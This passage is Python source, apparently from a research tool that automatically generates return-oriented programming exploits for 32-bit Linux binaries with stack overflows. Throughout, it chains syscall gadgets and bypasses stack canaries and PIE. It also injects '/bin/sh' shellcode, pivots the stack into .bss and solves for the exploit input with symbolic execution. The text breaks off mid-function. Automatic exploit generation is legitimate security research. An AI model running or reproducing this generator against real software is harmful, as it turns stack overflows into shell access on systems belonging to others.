"""
author : 4everdestiny
create_time : 2022.12.18
description : this is the code to generate Return Oriented Programming payload
1. check the protection
2. generate the exploit
input : binary path
output : the exploit needed in x86 architecture
"""

from exploit_generation.PayloadList import PayloadList
from exploit_generation.PayloadElement import PayloadElement
from exploit_generation.ProtectionInformation import ProtectionInformation
from exploit_generation.GadgetsFind import GadgetsFind
from exploit_generation.SinglePayload import SinglePayload
from log.log import Log
from state.StackOverFlowStateLog import SingleStackOverFlowStateLog
from global_func.FunctionHelper import Functionhelper
from global_func.BackDoorFinder import BackDoorFinder
import pwn
import re
import sys
import angr

log = Log()


class ROPGenerationLinuxX86:
    def __init__(self, binarypath, needlength=0,
                 avoidchars=b"", prefixlength=0, needline=False,
                 libcpath="../binaries/libcs/libc-2.27.so",
                 statelog=SingleStackOverFlowStateLog(),
                 function_helper=Functionhelper()
                 ):
        self.binarypath = binarypath
        self.libcpath = libcpath
        self.needlength = needlength
        self.avoidchars = avoidchars
        self.prefixlength = prefixlength
        self.needline = needline
        self.payloadlist = PayloadList()
        self.statelog = statelog
        self.elf = pwn.ELF(self.binarypath, checksec=False)
        self.libc = pwn.ELF(self.libcpath, checksec=False)
        protection = ProtectionInformation(self.binarypath).GetProtection()
        self.canary = protection["Canary"]
        self.NX = protection["NX"]
        self.PIE = protection["PIE"]
        self.static = protection["static"]
        self.arch = protection["arch"]
        self.gadgetservice = GadgetsFind(
            binarypath=self.binarypath, avoidchars=avoidchars)
        self.load_general_single_payload_content = b""
        self.have_replace = False
        self.replace_data = []
        self.canary_offset_ebp = 0
        self.have_find_canary = False
        self.debug = True
        self.replace_byte = 0x72 # hex(ord("r"))
        self.exploit_method = ""
        self.function_helper = function_helper

    def GetPayloadList(self):
        """
        just return the payload list generated
        :return: the payloadlist generated
        """
        return self.payloadlist

    def GenerateShellcode(self):
        """
        just generate a shellcode according to the architecture
        :return: a shellcode
        """
        pwn.context.arch = self.elf.arch
        pwn.context.bits = self.elf.bits
        pwn.context.endian = self.elf.endian
        shellcode = pwn.asm(pwn.shellcraft.sh())
        return shellcode

    def GetBssAddressWrite(self, for_rop=False):
        """
        return the bss address middle for rop payload
        :param for_rop: if the address is for rop data, set it True, otherwise set it False
        :return: the address calculate
        """
        if self.elf.bss() & 0xf00 <= 0x800:
            bss_address = ((self.elf.bss() + 0x800) & 0xfffff00) + 0x80
        else:
            bss_address = (self.elf.bss() & 0xffffff00) + 0x80
        if for_rop:
            return bss_address
        return bss_address + 0x100

    def RegisterGadgetGenerate(self, gadget=None, register="esp",
                               register_value=PayloadElement()):
        """
        accoiding to the register, generate the final payload
        if register is not in the gadget.affected_regs, return empty string
        for example:
        gadget = pop rsi, pop r15, ret
        register = rsi
        payload = p64(gadget) + p64(value) + p64(0) + p64(ret)
        update:
        if pie enabled, we cannot generate like before
        so we must use a standard PayloadElement
        also leave an interface to x86 or other architecture
        :param gadget: the gadget you find
        :param register: the register which want to change
        :param register_value: the register's value, remember it must in PayloadElement type
        :return: the payload according to the value
        """
        if self.arch != "i386":
            log.Exception("architeture error, please check it")
        if gadget is not None:
            if register not in gadget.affected_regs:
                log.Exception("the register is not in the gadget, check the code")
                return None
            else:
                payload = []
                payload.append(PayloadElement(
                    datavalue=gadget.address, adjustinfo="elf_base",
                    datatype="int32"
                ))
                affected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget)
                for i in range(len(affected_regs)):
                    if register == affected_regs[i]:
                        payload.append(register_value)
                    else:
                        payload.append(PayloadElement(
                            datavalue=0, adjustinfo=None,
                            datatype="int32"
                        ))
                return payload
        else:
            log.Exception("gadget is None, please check the code")
            return None

    def ListRegisterGadgetGenerate(self, gadget, registers=None,
                               registers_value=None):
        """
        accoiding to the register, generate the final payload
        if register is not in the gadget.affected_regs, return empty string
        for example:
        gadget = pop rdi, pop rsi, ret
        register = [rdi, rsi]
        payload = p64(gadget) + p64(rdi_value) + p64(rsi_value)
        update:
        if pie enabled, we cannot generate like before
        so we must use a standard PayloadElement
        also leave an interface to x86 or other architecture
        :param gadget: the gadget you find
        :param registers: the registers which want to change
        :param registers_value: the registers' value, remember it must in PayloadElement type
        :return: the payload according to the value
        """
        if self.arch != "i386":
            log.Exception("architeture error, please check it")
        if gadget is not None:
            for register in registers:
                if register not in gadget.affected_regs:
                    log.Exception("the register is not in the gadget, check the code")
                    return None
            payload = []
            payload.append(PayloadElement(
                datavalue=gadget.address, adjustinfo="elf_base",
                datatype="int32"
            ))
            affected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget)
            for i in range(len(affected_regs)):
                find_flag = False
                for j in range(len(registers)):
                    if registers[j] == affected_regs[i]:
                        payload.append(registers_value[i])
                        find_flag = True
                if not find_flag:
                    payload.append(PayloadElement(
                        datavalue=0, adjustinfo=None,
                        datatype="int32"
                    ))
            return payload
        else:
            log.Exception("gadget is None, please check the code")
            return None

    def SyscallROPPayloadGenerate_X86(self, ebx=PayloadElement(), ecx=PayloadElement(), edx=PayloadElement(),
                                  syscall_tab=PayloadElement()):
        """
        generate a ROP according to the specific value of the registers
        and the specific syscall such as read/write/execve
        :param ebx: the first parameter of this syscall
        :param ecx: the second parameter of this syscall
        :param edx: the third parameter of this syscall
        :param syscall_tab: the specific syscall number
        :return: the payload you need
        """
        registers = ["eax", "ebx", "ecx", "edx"]
        registers_bak = registers[:]
        gadgets = []
        special_gadgets = []
        value = {"eax": syscall_tab, "ebx": ebx, "ecx": ecx, "edx": edx}
        for reg in registers:
            temp_registers = registers_bak[:]
            temp_registers.remove(reg)
            gadget = self.gadgetservice.FindPopGadget(
                register=reg, avoid_registers=temp_registers)
            if gadget is None:
                gadget_temp = self.gadgetservice.FindPopGadget(
                    register=reg)
                if gadget_temp is None:
                    log.Exception("cannot find special gadgets, please check it")
                    raise Exception("cannot find special gadgets, please check it")
                log.info("we need to use {address} gadget, whose registers are {registers}".format(address=hex(gadget_temp.address),registers=gadget_temp.affected_regs))
                special_gadgets.append(gadget_temp)
        for gadget in special_gadgets:
            for reg in gadget.affected_regs:
                if reg in registers:
                    registers.remove(reg)
        for reg in registers:
            temp_registers = registers_bak[:]
            temp_registers.remove(reg)
            gadget = self.gadgetservice.FindPopGadget(
                register=reg, avoid_registers=temp_registers)
            if gadget is not None:
                gadgets.append(gadget)
            else:
                log.Exception("some logic error here, please check it")
                return None
        payload = []
        for gadget in special_gadgets:
            registers_value = []
            regs = []
            afftected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget=gadget)
            for reg in afftected_regs:
                if reg in registers_bak:
                    regs.append(reg)
                    registers_value.append(value[reg])
            payload.extend(self.ListRegisterGadgetGenerate(
                gadget=gadget, registers=regs, registers_value=registers_value))
        for gadget in gadgets:
            afftected_regs = self.gadgetservice.GetGadgetAffectedRegisters(gadget=gadget)
            for reg in afftected_regs:
                if reg in registers_bak:
                    payload.extend(self.RegisterGadgetGenerate(
                        gadget=gadget, register=reg, register_value=value[reg]))
                    break
        int0x80_gadget = self.gadgetservice.FindInstructionGadget(instruction="int 0x80;ret")
        payload.append(PayloadElement(
            datavalue=int0x80_gadget.address, adjustinfo="elf_base",
            datatype="int32"
        ))
        return payload

    def FindCanaryInStack(self):
        """
        find the canary in stack, because the canary in x86 cannot use the fs + 0x14
        to locate
        :return: whether find, canary value, and offset to ebp
        """
        state = self.statelog.state
        if state.arch.name != "X86":
            log.Exception("archtecture error, please check it")
            return False, 0
        function_address = state.callstack.current_function_address
        log.info("function_address:" + hex(function_address))
        project = self.statelog.pre_statelog.project
        block = project.factory.block(function_address)
        code = block.disassembly.__str__()
        for _ in range(0x20):
            if "gs" not in code:
                function_address += block.size
                block = project.factory.block(function_address)
                code = block.disassembly.__str__()
                continue
            else:
                break
        code_lines = code.split("\n")
        line2 = ""
        for index in range(len(code_lines)):
            line = code_lines[index]
            if "gs" in line:
                log.info("find gs register in the line: {instruction}".format(instruction=line))
                line2 = code_lines[index + 1]
                log.info("find the offset in this line: {instruction}".format(instruction=line2))
                break
        if line2 == "":
            log.Exception("cannot find instructions")
            return False, 0
        #0x804864f:\tmov\tdword ptr [ebp - 0xc], eax
        offset = re.findall("0x[a-f0-9]+", line2)
        offset = -int(offset[1], 16)
        log.success("find offset:" + str(offset))
        return True, offset

    def OptimizeForROP(self, payload=None, adjustcanary=True, have_ebp=False):
        """
        in ROP payload, when there is PIE protection enable
        we don't need to adjust the payload
        but when PIE protection disable
        we need to adjust the payload
        for example:
        ["elf_base",0x1000]
        when PIE disable:
        ["int64",0x1000]
        :param adjustcanary: if True, adjust canary in this payload, if False, no need
        :return: None
        """
        if payload is None:
            log.Exception("payload is None, please check it in OptimizeForROP")
            return False
        if self.arch != "i386":
            log.Exception("architecture error, please check it")
            return False
        if self.PIE:
            log.info("for PIE enabled, no need for adjust this payload in PIE")
        else:
            log.info("PIE disabled, change the elf_base in payload to int32")
            for payloadelement in payload:
                if payloadelement.adjustinfo == "elf_base":
                    payloadelement.SetAdjustInfo(adjustinfo=None)
        if self.canary and adjustcanary:
            log.info("canary enabled, insert some value to this payload")
            # this 0 is used for rbp position
            if not self.have_find_canary:
                self.have_find_canary, offset = self.FindCanaryInStack()
                have_find_canary = self.have_find_canary
            else:
                have_find_canary = True
                offset = self.canary_offset_ebp + 4
            if have_find_canary:
                log.info("canary find in ebp{offset}".format(offset=str(offset)))
                index = int((-offset) / 0x4)
                if not have_ebp:
                    # for ebp
                    payload.insert(0, PayloadElement(
                        datavalue=0, adjustinfo=None, datatype="int32"))
                for _ in range(index - 1):
                    if _ != 0:
                        payload.insert(0, PayloadElement(
                            datavalue=0, adjustinfo=None, datatype="int32"))
                    else:
                        # this line is used for some protection used in ebx
                        # like this:
                        # .text:00000795                 mov     ebx, [ebp+var_4]
                        # .text:00000798                 leave
                        # .text:00000799                 retn
                        #got_offset = self.elf.got["__libc_start_main"] & 0xfffff000
                        if self.elf.get_section_by_name(".got.plt") is None:
                            got_offset = self.elf.get_section_by_name(".got").header.sh_addr
                        else:
                            got_offset = self.elf.get_section_by_name(".got.plt").header.sh_addr
                        if self.PIE:
                            payload.insert(0, PayloadElement(
                                datavalue=got_offset, adjustinfo="elf_base", datatype="int32"))
                        else:
                            payload.insert(0, PayloadElement(
                                datavalue=0, adjustinfo=None, datatype="int32"))
                payload.insert(0, PayloadElement(
                    datavalue=0, adjustinfo="canary", datatype="int32"))
                # prefixlength - 0x10 for the space given to canary value and rbp
                self.canary_offset_ebp = - (index) * 0x4 - 4
                # self.prefixlength = self.prefixlength_bak + self.canary_offset
            else:
                log.Exception("cannot find canary position in this function, use default position")
                if not have_ebp:
                    payload.insert(0, PayloadElement(
                        datavalue=0, adjustinfo=None, datatype="int32"))
                payload.insert(0, PayloadElement(
                    datavalue=0, adjustinfo="canary", datatype="int32"))
                # prefixlength - 0x10 for the space given to canary value and rbp
                self.canary_offset_ebp = - 0x8
                # self.prefixlength = self.prefixlength_bak + self.canary_offset
        else:
            log.info("canary disabled, no need for adjust this payload in canary")
        return True

    def ParseScanfSuffixPayload(self):
        """
        for scanf function, we need to parse the format
        such as "%d %s %c", we need to give a prefix and suffix payload
        :return: None
        """
        if self.statelog is None:
            log.Exception("statelog is None, please check it")
            return False
        scanfinfo = self.statelog.scanfinfo
        if scanfinfo is None:
            log.Exception("statelog is None, please check it")
            return False
        formats = list("dscuoxX")
        for i in range(scanfinfo.overflow_index + 1, len(scanfinfo.formats)):
            #re.findall(r"%\d*[dscuoxX]", formatstring)
            format = scanfinfo.formats[i][-1]
            if format in formats:
                payload_string = b"\x30\n" #0\n
                payload = [PayloadElement(
                    datavalue=payload_string, adjustinfo=None, datatype="bytes")]
                singelpayload = SinglePayload(
                    content=payload, length=len(payload_string),
                    prefixlength=0
                )
                if i == len(scanfinfo.formats) - 1:
                    return singelpayload
                else:
                    self.payloadlist.AppendPayload(singelpayload)
            else:
                log.Exception("format error in scanf:{format}".format(format=scanfinfo.formats[i]))

    def FindSymbolicAddressByLength(self, length=0, begin=0, end=0,
                                    direction="forward", need_check_align=False):
        """
        find an address, [address, address + length] is all symbolic,
        and begin <= address <= address + length <= end
        :param length: the length of symbolic data
        :param begin: the begin address of range
        :param end: the end address of range
        :param direction: the direction you need when find the symbolic address
        :param need_check_align: check align when generate payload
        :return: (True, address) when find, (False, 0) when not
        """
        # init length check for some small segement
        if need_check_align:
            if not (length % 0x4 == 0):
                begin = (begin + 0x4) & 0xfffffffc
                end = (end - 0x4) & 0xfffffffc
        if end - begin < length:
            return False, 0
        state = self.statelog.state
        if direction == "forward":
            for index in range(begin, end - length, 4):
                # here choose 4 as the offset, because of the data alignment
                begin_sym = state.mem[index].byte.resolved
                end_sym = state.mem[index + length - 1].byte.resolved
                if begin_sym.symbolic and end_sym.symbolic:
                    # here maybe we find a place which is all symbolic
                    all_symbolic = True
                    for offset in range(index + 1, index + length - 1):
                        temp_sym = state.mem[offset].byte.resolved
                        if not temp_sym.symbolic:
                            all_symbolic = False
                            break
                    if all_symbolic:
                        return True, index
        elif direction == "backward":
            for index in range(end, begin - 4 + length, -4):
                # here choose 4 as the offset, because of the data alignment
                begin_sym = state.mem[index - length].byte.resolved
                end_sym = state.mem[index - 1].byte.resolved
                if begin_sym.symbolic and end_sym.symbolic:
                    # here maybe we find a place which is all symbolic
                    all_symbolic = True
                    for offset in range(index - length + 1, index - 1):
                        temp_sym = state.mem[offset].byte.resolved
                        if not temp_sym.symbolic:
                            all_symbolic = False
                            break
                    if all_symbolic:
                        return True, index - length + 1
        return False, 0

    def GenerateReplacePayload(self, address=0,
                               single_payload=SinglePayload(), isgeneralcheck=False):
        """
        sometimes we have dynamic data in single payload, for this time
        we just replace the single payload
        :param address: the address for loading this payload
        :param single_payload: the single payload generate
        :param isgeneralcheck: if this vulnerability comes from general check, set it True
        :return: True when successfully find replace payload, false when not
        """
        state = self.statelog.state
        copy_state = self.statelog.state.copy()
        address_sym = state.mem[address].uint8_t.resolved
        if not address_sym.symbolic:
            return False
        length = single_payload.GetContentLength()
        if single_payload.prefixlength < 0:
            length += single_payload.prefixlength
        test_input = self.replace_byte.to_bytes(length=1, byteorder="little") * length
        self.replace_byte += 1
        constrained_parameter_address = address
        constrained_parameter_size_bytes = length
        constrained_parameter_bitvector = state.memory.load(
            constrained_parameter_address,
            constrained_parameter_size_bytes
        )
        constrained_parameter_desired_value = test_input
        constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
        # copy_state.add_constraints(constraint_expression)
        if state.satisfiable(extra_constraints=[constraint_expression]):
            state.add_constraints(constraint_expression)
            all_input = state.posix.dumps(sys.stdin.fileno())
            if test_input in all_input:
                self.have_replace = True
                if single_payload.prefixlength < 0:
                    index = all_input.index(test_input)
                    final_input = all_input[index + single_payload.prefixlength:index] + test_input
                else:
                    final_input = test_input
                replace_data = [final_input, single_payload]
                self.replace_data.append(replace_data)
                if self.statelog.state.satisfiable():
                    return True
                else:
                    self.statelog.state = copy_state
                    return False
            else:
                self.statelog.state = copy_state
                return False
        else:
            return False

    def TryLoadPayloadForAddress(self, address=0, single_payload=SinglePayload()):
        """
        After find an address for the data, we need to load this data and find the input
        :param address: the address to load
        :return: True when success, False when not
        """
        state = self.statelog.state
        address_sym = state.mem[address].uint8_t.resolved
        if not address_sym.symbolic:
            return False
        input_find = False
        length = single_payload.GetContentLength()
        if single_payload.prefixlength < 0:
            # here means we have canary in the payload content
            # # but we cannot directly use it, so minus the offset
            length += single_payload.prefixlength
        test_input = b"1" * length
        constrained_parameter_address = address
        constrained_parameter_size_bytes = length
        constrained_parameter_bitvector = state.memory.load(
            constrained_parameter_address,
            constrained_parameter_size_bytes
        )
        constrained_parameter_desired_value = test_input
        constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
        if state.satisfiable(extra_constraints=[constraint_expression]):
            copy_state = state.copy()
            copy_state.add_constraints(constraint_expression)
            all_input = copy_state.posix.dumps(sys.stdin.fileno())
            if test_input in all_input:
                input_find = True
            else:
                return False
        else:
            return False
        if input_find:
            # here, we can find the payload in the input
            # so we can just add constraint and dump the input as payload
            state = self.statelog.state
            if single_payload.CheckStaticPayload():
                input_data = single_payload.GetPayload()
            else:
                return self.GenerateReplacePayload(
                    address=address, single_payload=single_payload
                )
            constrained_parameter_address = address
            constrained_parameter_size_bytes = length
            constrained_parameter_bitvector = state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = input_data
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            if state.satisfiable(extra_constraints=[constraint_expression]):
                state.add_constraints(constraint_expression)
                return True
            else:
                return False
        else:
            # here, we cannot find the payload in the input
            # so we can just add constraint and dump the input as payload
            state = self.statelog.state
            if single_payload.CheckStaticPayload():
                input_data = single_payload.GetPayload()
            else:
                # here, means we have some dynamic data in the input
                # and we cannot just replace the data in the input
                # so return False
                return False
            constrained_parameter_address = address
            constrained_parameter_size_bytes = length
            constrained_parameter_bitvector = copy_state.memory.load(
                constrained_parameter_address,
                constrained_parameter_size_bytes
            )
            constrained_parameter_desired_value = input_data
            constraint_expression = constrained_parameter_bitvector == constrained_parameter_desired_value
            if state.satisfiable(extra_constraints=constraint_expression):
                state.add_constraints(constraint_expression)
                return True
            else:
                return False

    def LoadDataAndFindAddress(self, single_payload=SinglePayload(),
                               direction="forward", privilege="rwx",
                               need_check_align=False, issystemroppayload=False):
        """
        for ROP and shellcode, sometimes we need to find a place to store
        the data, and then for loading this data to this address
        algorithm:
        1. search the address from .data segement and .bss segement
        2. [start, start + length] is symbolic
        3. must have effect to the input data
        4. if we can find the data in input is the best,
        if not, we must ensure this have effect for input
        :param data: the SinglePayload data
        :param direction: in stack pivoting, we should find the place backward,
        generally, use forward
        :param privilege: the privilege needed for the data load
        :param need_check_align: when load rop, we need an address & 0x4 == 0
        :return: (True, address) when success find, (False, 0) when not
        """
        length = single_payload.GetContentLength()
        obj = self.statelog.project.loader.main_object
        data_start = obj.sections_map[".data"].min_addr
        data_end = obj.sections_map[".data"].max_addr
        bss_start = obj.sections_map[".bss"].min_addr
        bss_end = obj.sections_map[".bss"].max_addr
        if "x" in privilege and self.NX:
            findflag = False
            address = 0
        else:
            findflag, address = self.FindSymbolicAddressByLength(
                begin=data_start, end=data_end, length=length, direction=direction)
        if not findflag:
            if "x" in privilege and self.NX:
                findflag = False
                address = 0
            else:
                findflag, address = self.FindSymbolicAddressByLength(
                    begin=bss_start, end=bss_end, length=length,
                    direction=direction, need_check_align=need_check_align)
        if not findflag:
            return False, 0
        # test_input = b"1" * length
        if issystemroppayload:
            proj = self.statelog.project.loader.main_object
            rw_position = proj.sections_map[".bss"].min_addr & 0xfffff000
            if address - rw_position < 0x300:
                # here, the rop payload is too near around the end of rw postion
                # may error when call system("/bin/sh")
                # 0x300 is tested by some binaies
                log.info("the payload is too close to the end of bss, error in LoadDataAndFindAddress")
                return False, 0
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=single_payload
        )
        if self.PIE:
            address -= self.statelog.project.loader.main_object.min_addr
        return can_load, address

    def LoadShellcodeAndReturn(self):
        """
        when the overflow length is not enough,
        we can load a shellcode to an address and then return
        here we need to find an address, and then return
        :return: True when success, False when not
        """
        shellcode = self.GenerateShellcode()
        payload = [PayloadElement(
            datavalue=shellcode, adjustinfo=None, datatype="bytes")]
        single_payload = SinglePayload(
            content=payload, length=len(shellcode),
            prefixlength=0
        )
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=single_payload, privilege="rwx",
            need_check_align=False, direction="backward")
        if not can_load:
            return False
        address_element = PayloadElement(
                datavalue=address, adjustinfo="elf_base", datatype="int32"
        )
        final_payload = []
        final_payload.append(address_element)
        final_payload_canary = final_payload[:]
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        self.OptimizeForROP(payload=final_payload_canary, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=self.needlength,
            prefixlength=self.prefixlength, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_load = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=False,
            avoidchars=b""
        )
        singlepayload_canary = SinglePayload(
            content=final_payload_canary, length=self.needlength,
            prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
            avoidchars=self.avoidchars
        )
        singlepayload_canary_load = SinglePayload(
            content=final_payload_canary, length=0,
            prefixlength=self.canary_offset_ebp, needline=False,
            avoidchars=b""
        )
        if self.HandleFinalPayload(
            singlepayload=singlepayload,
            singlepayload_load=singlepayload_load,
            singlepayload_canary=singlepayload_canary,
            singlepayload_canary_load=singlepayload_canary_load,
            haverecvlibc=False,
            issystemroppayload=False # a shellcode payload
        ):
            log.success("successfully generate a payload in LoadShellcodeAndReturn")
            return True
        log.info("cannot generate load shellcode and return payload in LoadShellcodeAndReturn")
        return False

    def LoadPayloadAndReturn(self, single_payload=SinglePayload(),
                             single_payload_canary=SinglePayload(),
                             have_recv=False, issystemroppayload=False):
        """
        sometime, if we don't have enough space for the ROP payload,
        like load shellcode and return, we need to find a place for
        loading the ROP data to some place.
        :param single_payload: the payload which you want to load
        :param single_payload_canary: the single payload which have canary
        :param have_recv: the single_payload have or not have recv information
        :param issystemroppayload: this is a rop payload or not, True when is, False when not
        :return: True when success, False when not
        """
        state_bak = self.statelog.state.copy()
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=single_payload, direction="backward",
            privilege="rw", need_check_align=True, issystemroppayload=issystemroppayload)
        if not can_load:
            return False
        address_element = PayloadElement(
            datavalue=address - 4, adjustinfo="elf_base", datatype="int32"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=True)
        if self.canary:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
                avoidchars=self.avoidchars
            )
        else:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength - 4, needline=self.needline,
                avoidchars=self.avoidchars
            )
        if self.CheckPayloadLength(singlepayload=singlepayload):
            log.success("successfully generate a payload in LoadPayloadAndReturn")
            if have_recv:
                self.GenerateFinalPayload(singlepayload=singlepayload)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=singlepayload)
            return True
        log.info("cannot generate load payload and return payload in LoadPayloadAndReturn")
        return False

    def LoadInputPayloadAndReturn(self, single_payload=SinglePayload(),
                             have_recv=False, issystemroppayload=False):
        """
        sometime, if we don't have enough space for the ROP payload,
        like load shellcode and return, we need to find a place for
        loading the ROP data to some place.
        and also, sometimes the payload is too near to .bss end,
        sometimes the original payload is too long, wo we have another
        chance to use this method
        :param single_payload: the payload which you want to load
        :param have_recv: the single_payload have or not have recv information
        :param issystemroppayload: this is a rop payload or not, True when is, False when not
        :return: True when success, False when not
        """
        bss_address = self.GetBssAddressWrite(for_rop=True)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int32"
        )
        length = single_payload.GetContentLength()
        need_send_payload = single_payload
        final_payload, avoidchars, needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=length,
            need_pop=True
        )
        ebp_gadget = self.gadgetservice.FindPopGadget(register="ebp")
        bss_address_minus4_element = PayloadElement(
            datavalue=bss_address - 0x4, adjustinfo="elf_base",
            datatype="int32")
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=ebp_gadget, register="ebp",
            register_value=bss_address_minus4_element
        ))
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
        input_payload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=0, needline=needline,
            avoidchars=avoidchars
        )
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=input_payload, direction="backward",
            privilege="rw", need_check_align=True)
        if not can_load:
            return False
        address_element = PayloadElement(
            datavalue=address - 4, adjustinfo="elf_base", datatype="int32"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        self.OptimizeForROP(payload=final_payload,
                            adjustcanary=True, have_ebp=True)
        if self.canary:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength + self.canary_offset_ebp, needline=self.needline,
                avoidchars=self.avoidchars
            )
        else:
            singlepayload = SinglePayload(
                content=final_payload, length=self.needlength,
                prefixlength=self.prefixlength - 4, needline=self.needline,
                avoidchars=self.avoidchars
            )
        if self.CheckPayloadLength(singlepayload=singlepayload):
            log.success("successfully generate a payload in LoadInputPayloadAndReturn")
            if have_recv:
                self.GenerateFinalPayload(
                    singlepayload=singlepayload,
                    need_send_payload=need_send_payload,
                    need_send=True
                )
            else:
                self.GenerateFinalPayloadNoRecv(
                    singlepayload=singlepayload,
                    need_send_payload=need_send_payload,
                    need_send=True
                )
            return True
        log.info("cannot generate load payload and return payload in LoadInputPayloadAndReturn")
        return False

    def LoadPayloadForGeneralCheck(self, single_payload=SinglePayload(),
                                   singlepayload_canary=SinglePayload(),
                                   haverecvlibc=False,
                                   issystemroppayload=False):
        """
        when the stackoverflow is created by general check, we should use this
        function to load the payload to the state
        remember the state, eip is the return address, because when ret breakpoint hit
        the program has run after the ret insturction
        :param singlepayload: the singlepayload generate by the functions
        :param singlepayload_canary: the singlepayload_canary which have canary
        :param haverecvlibc: the single_payload have or not have recv information
        :param issystemroppayload: if this is a system rop payload, we need to choose a
        place don't be so close to .bss
        :return: True when success, False when not
        """
        if self.statelog.functionname != "general_check":
            log.Exception("must used in general check vulnerability")
            return False
        state = self.statelog.state
        state_bak = state.copy()
        if single_payload.CheckStaticPayload():
            self.load_general_single_payload_content = single_payload.GetPayload()
        # state.add_constraints(state.regs.eip == ret_gadget.address)
        address = state.solver.eval(state.regs.esp)
        address -= 4 # this is for ret instruction
        # for return, we need to insert canary
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=singlepayload_canary
        )
        if state.satisfiable() and can_load:
            if haverecvlibc:
                self.GenerateFinalPayload(singlepayload=None)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=None)
            return True
        else:
            log.info("cannot generate load payload and return payload in LoadPayloadForGeneralCheck")
            self.statelog.state = state_bak
            # return False
        # if we come to this place, means we cannot directly write the payload to return address
        # thus we need to find a place to store these payload and return
        log.info("try to find a place to load payload")
        state = self.statelog.state
        state_bak = state.copy()
        # for load, donnot need to have canary
        can_load, address = self.LoadDataAndFindAddress(
            single_payload=single_payload, direction="backward",
            privilege="rw", need_check_align=True, issystemroppayload=issystemroppayload)
        if not can_load:
            log.info("cannot generate load payload and return payload in LoadPayloadForGeneralCheck")
            self.statelog.state = state_bak
            return False

        address_element = PayloadElement(
            datavalue=address - 4, adjustinfo="elf_base", datatype="int32"
        )
        final_payload = []
        final_payload.append(address_element)
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=True)
        singlepayload = SinglePayload(
            content=final_payload, length=0,
            prefixlength=self.canary_offset_ebp, needline=0,
            avoidchars=self.avoidchars
        )
        state = self.statelog.state
        state_bak = state.copy()
        # state.add_constraints(state.regs.eip == ret_gadget.address)
        address = state.solver.eval(state.regs.esp)
        address -= 8  # this is for ret instruction, and also the ebp
        can_load = self.TryLoadPayloadForAddress(
            address=address, single_payload=singlepayload
        )
        if state.satisfiable() and can_load:
            if haverecvlibc:
                self.GenerateFinalPayload(singlepayload=None)
            else:
                self.GenerateFinalPayloadNoRecv(singlepayload=None)
        else:
            self.statelog.state = state_bak
        log.success("successfully generate a payload in LoadPayloadForGeneralCheck")
        return True

    def LoadInputPayloadForGeneralCheck(self, single_payload=SinglePayload(),
                                   haverecvlibc=False,
                                   issystemroppayload=False):
        """
        when the stackoverflow is created by general check, we should use this
        function to load the payload to the state
        remember the state, eip is the return address, because when ret breakpoint hit
        the program has run after the ret insturction
        :param singlepayload: the singlepayload generate by the functions
        :param haverecvlibc: the single_payload have or not have recv information
        :param issystemroppayload: if this is a system rop payload, we need to choose a
        place don't be so close to .bss
        :return: True when success, False when not
        """
        if self.statelog.functionname != "general_check":
            log.Exception("must used in general check vulnerability")
            return False
        if single_payload.CheckStaticPayload():
            self.load_general_single_payload_content = single_payload.GetPayload()

        bss_address = self.GetBssAddressWrite(for_rop=True)
        bss_address_element = PayloadElement(
            datavalue=bss_address, adjustinfo="elf_base", datatype="int32"
        )
        length = single_payload.GetContentLength()
        need_send_payload = single_payload
        final_payload, avoidchars, needline = self.InputROPPayloadGenertate(
            address_element=bss_address_element,
            length=length,
            need_pop=True
        )
        ebp_gadget = self.gadgetservice.FindPopGadget(register="ebp")
        bss_address_minus4_element = PayloadElement(
            datavalue=bss_address - 0x4, adjustinfo="elf_base",
            datatype="int32")
        final_payload.extend(self.RegisterGadgetGenerate(
            gadget=ebp_gadget, register="ebp",
            register_value=bss_address_minus4_element
        ))
        leave_ret_gadget = self.gadgetservice.FindInstructionGadget(instruction="leave;ret")
        final_payload.append(PayloadElement(
            datavalue=leave_ret_gadget.address, adjustinfo="elf_base", datatype="int32"
        ))
        self.OptimizeForROP(payload=final_payload, adjustcanary=False)
